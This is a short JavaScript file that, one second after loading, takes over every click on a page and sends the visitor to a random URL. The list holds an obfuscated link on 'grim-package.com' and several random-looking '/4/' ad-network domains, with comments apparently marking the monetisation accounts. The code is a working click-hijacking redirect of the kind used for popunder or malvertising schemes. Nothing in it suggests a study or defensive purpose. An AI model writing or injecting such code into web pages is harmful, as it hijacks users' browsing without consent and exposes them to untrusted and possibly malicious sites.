function init() {
  var arr = [
    // hil: dabao
    "https://grim-package.com/bO3WV.0sPU3rp/vSbumMVaJkZVD/0U1/N/DDMG2sOOTWcm2zL-TSUR0mMhzbYS5oNYz/cJ",
    "https://www.qrcreate.online",

    // mon: db
    "https://glooghalty.net/4/7237941",
    "https://owhopteefi.net/4/7436813",
    // "https://pseleedrax.net/4/7237942",
    // "https://beewoupaule.net/4/7420696",
    // "https://koachewhome.net/4/7237921",
    // "https://faireegli.net/4/7474716",
    
  ];
 
  var didOpen = false;
  document.addEventListener("click", function() {
    if (didOpen) {
      return;
    }
    didOpen = true;
    setTimeout(() => {
      didOpen = false;
    }, 15000);

    var randomIndex = Math.floor(Math.random() * arr.length);
    var randomLink = arr[randomIndex];
    window.location.href = randomLink;
  });
}

setTimeout(() => {
  init();
}, 1000);